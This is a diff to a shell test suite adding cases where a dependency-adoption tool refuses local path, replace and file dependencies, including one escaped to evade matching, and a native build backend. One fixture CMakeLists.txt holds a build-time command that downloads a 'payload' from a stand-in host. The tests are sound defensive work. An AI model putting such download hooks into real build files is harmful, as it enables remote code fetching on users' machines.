@@ -1103,6 +1103,27 @@ assert_contains "$TMP_DIR/adopt-rust-malformed.out.err" \
 [ ! -e "$ADOPT_RUST_MALFORMED/.touchstone.toml" ] \
   || fail "malformed Cargo manifest refusal mutated the repository"
 
+ADOPT_RUST_LOCAL="$TMP_DIR/adopt-rust-local"
+init_adoption_repo "$ADOPT_RUST_LOCAL"
+printf '%s\n' '[package]' 'name = "fixture"' '[dependencies]' \
+  'shared = { path = "../shared" }' >"$ADOPT_RUST_LOCAL/Cargo.toml"
+printf '%s\n' 'version = 4' >"$ADOPT_RUST_LOCAL/Cargo.lock"
+commit_adoption_repo "$ADOPT_RUST_LOCAL" "fixture"
+git -C "$ADOPT_RUST_LOCAL" switch -q -c feat/adopt
+run_adoption "$TMP_DIR/adopt-rust-local.out" adopt --dry-run --project "$ADOPT_RUST_LOCAL"
+[ "$ADOPTION_STATUS" -eq 4 ] || fail "checkout-external Cargo dependency was accepted"
+assert_contains "$TMP_DIR/adopt-rust-local.out.err" 'declares a local path dependency'
+
+ADOPT_GO_LOCAL="$TMP_DIR/adopt-go-local"
+init_adoption_repo "$ADOPT_GO_LOCAL"
+printf '%s\n' 'module example.invalid/fixture' 'go 1.24' \
+  'replace example.invalid/shared => ../shared' >"$ADOPT_GO_LOCAL/go.mod"
+commit_adoption_repo "$ADOPT_GO_LOCAL" "fixture"
+git -C "$ADOPT_GO_LOCAL" switch -q -c feat/adopt
+run_adoption "$TMP_DIR/adopt-go-local.out" adopt --dry-run --project "$ADOPT_GO_LOCAL"
+[ "$ADOPTION_STATUS" -eq 4 ] || fail "checkout-external Go replacement was accepted"
+assert_contains "$TMP_DIR/adopt-go-local.out.err" 'declares a local replacement'
+
 ADOPT_NODE_IGNORED_LOCK="$TMP_DIR/adopt-node-ignored-lock"
 init_adoption_repo "$ADOPT_NODE_IGNORED_LOCK"
 printf '%s\n' '{"scripts":{"test":"node --test"}}' >"$ADOPT_NODE_IGNORED_LOCK/package.json"
@@ -1113,6 +1134,18 @@ git -C "$ADOPT_NODE_IGNORED_LOCK" switch -q -c feat/adopt
 run_adoption "$TMP_DIR/adopt-node-ignored-lock.out" adopt --dry-run --project "$ADOPT_NODE_IGNORED_LOCK"
 [ "$ADOPTION_STATUS" -eq 4 ] || fail "Node adoption accepted a locally present ignored lockfile"
 assert_contains "$TMP_DIR/adopt-node-ignored-lock.out.err" "compiler input 'package-lock.json' is not tracked"
+
+ADOPT_NODE_LOCAL="$TMP_DIR/adopt-node-local"
+init_adoption_repo "$ADOPT_NODE_LOCAL"
+printf '%s\n' \
+  '{"scripts":{"test":"node --test"},"dependencies":{"shared":"f\u0069le:../shared"}}' \
+  >"$ADOPT_NODE_LOCAL/package.json"
+printf '{}\n' >"$ADOPT_NODE_LOCAL/package-lock.json"
+commit_adoption_repo "$ADOPT_NODE_LOCAL" "fixture"
+git -C "$ADOPT_NODE_LOCAL" switch -q -c feat/adopt
+run_adoption "$TMP_DIR/adopt-node-local.out" adopt --dry-run --project "$ADOPT_NODE_LOCAL"
+[ "$ADOPTION_STATUS" -eq 4 ] || fail "checkout-external Node file dependency was accepted"
+assert_contains "$TMP_DIR/adopt-node-local.out.err" 'declares a local file dependency'
 
 ADOPT_IGNORED_CONTRACT="$TMP_DIR/adopt-ignored-contract"
 init_adoption_repo "$ADOPT_IGNORED_CONTRACT"
@@ -1319,6 +1352,22 @@ for hatch_hook_kind in build metadata; do
   assert_contains "$TMP_DIR/adopt-hatch-$hatch_hook_kind-hook.out.err" \
     'build hook this portable compiler cannot verify offline'
 done
+
+ADOPT_NATIVE_BACKEND="$TMP_DIR/adopt-native-backend"
+init_adoption_repo "$ADOPT_NATIVE_BACKEND"
+printf '%s\n' '[build-system]' 'requires = ["scikit-build-core"]' \
+  'build-backend = "scikit_build_core.build"' '[project]' 'name = "fixture"' \
+  'dependencies = ["pytest"]' >"$ADOPT_NATIVE_BACKEND/pyproject.toml"
+printf '%s\n' 'cmake_minimum_required(VERSION 3.15)' \
+  'file(DOWNLOAD "https://example.invalid/payload" "payload")' \
+  >"$ADOPT_NATIVE_BACKEND/CMakeLists.txt"
+commit_adoption_repo "$ADOPT_NATIVE_BACKEND" "fixture"
+git -C "$ADOPT_NATIVE_BACKEND" switch -q -c feat/adopt
+run_adoption "$TMP_DIR/adopt-native-backend.out" \
+  adopt --dry-run --project "$ADOPT_NATIVE_BACKEND"
+[ "$ADOPTION_STATUS" -eq 4 ] || fail "native Python build backend was accepted"
+assert_contains "$TMP_DIR/adopt-native-backend.out.err" \
+  'build hook this portable compiler cannot verify offline'
 
 ADOPT_PYTHON_SETUP_HOOK="$TMP_DIR/adopt-python-setup-hook"
 init_adoption_repo "$ADOPT_PYTHON_SETUP_HOOK"
